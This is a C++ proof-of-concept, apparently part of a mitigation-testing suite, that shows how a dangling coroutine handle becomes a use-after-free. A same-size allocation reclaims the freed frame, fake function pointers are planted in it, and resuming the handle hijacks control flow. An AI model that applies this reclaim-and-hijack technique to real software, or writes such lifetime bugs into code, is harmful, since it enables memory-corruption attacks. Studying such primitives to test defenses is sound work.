/*
 * uaf_poc.cpp — CFOP Primitive 2: Use-After-Free reclaim (in-process)
 * ===================================================================
 * Realistic bug: a coroutine frame is freed while a coroutine_handle to it is
 * still held (a dangling handle — the single most common coroutine lifetime
 * bug). The attacker's next same-size heap allocation reclaims the freed chunk
 * with controlled contents, so when the stale handle is resumed the indirect
 * call through frame[0] lands on attacker-chosen code.
 *
 * Capability used: a UAF + control over one heap allocation's bytes, plus a
 * leaked code address (hijack_target). No arbitrary write.
 *
 * In-process because the reclaim must happen in the narrow window between the
 * free and the resume, which is awkward to drive remotely but trivial and
 * deterministic in-process (tcache returns the just-freed chunk).
 */
#include "cfop_common.h"

#include <cstdlib>

static Task worker() {
    fprintf(stderr, "[VICTIM] worker: running, now suspending at await\n");
    co_await std::suspend_always{};
    fprintf(stderr, "[VICTIM] worker: resumed on the legit path\n");
}

int main() {
    fprintf(stderr,
            "=== CFOP Primitive 2: Use-After-Free reclaim (in-process) ===\n");

    // 1. Victim creates and parks a coroutine.
    Task t = worker();
    t.handle.resume(); // parked at the co_await
    void *frame = t.handle.address();
    size_t sz = chunk_size(frame);
    fprintf(stderr,
            "[VICTIM] frame=%p usable=%zu legit resume_fn=%p\n",
            frame,
            sz,
            frame_resume(frame));

    // 2. BUG: the frame is destroyed (freed) but a handle to it is kept.
    auto dangling = t.handle; // stale copy of the handle
    t.handle = nullptr;       // stop ~Task from destroying again
    dangling.destroy();       // frame chunk returns to the allocator
    fprintf(stderr,
            "[VICTIM] (bug) frame freed; dangling handle still held\n");

    // 3. ATTACKER: the next same-size allocation reclaims the freed chunk, and
    //    its bytes are attacker-controlled — here, a fake frame.
    char *reclaim = new char[sz];
    fprintf(stderr,
            "[ATTACKER] reclaim=%p %s\n",
            reclaim,
            reclaim == frame ? "(== freed frame, reclaimed)"
                             : "(did NOT reclaim!)");
    void *tgt = (void *)&hijack_target;
    memcpy(reclaim + 0, &tgt, 8); // fake resume_fn
    memcpy(reclaim + 8, &tgt, 8); // fake destroy_fn
    fprintf(stderr,
            "[ATTACKER] planted hijack_target in reclaimed frame[0]/[8]\n");

    // 4. Victim resumes the dangling handle -> indirect call through frame[0].
    fprintf(stderr, "[VICTIM] resuming dangling handle...\n");
    dangling.resume(); // -> hijack_target on the vulnerable build

    fprintf(
        stderr,
        "[VICTIM] survived (a defense neutralized or aborted the hijack)\n");
    delete[] reclaim;
    return 0;
}
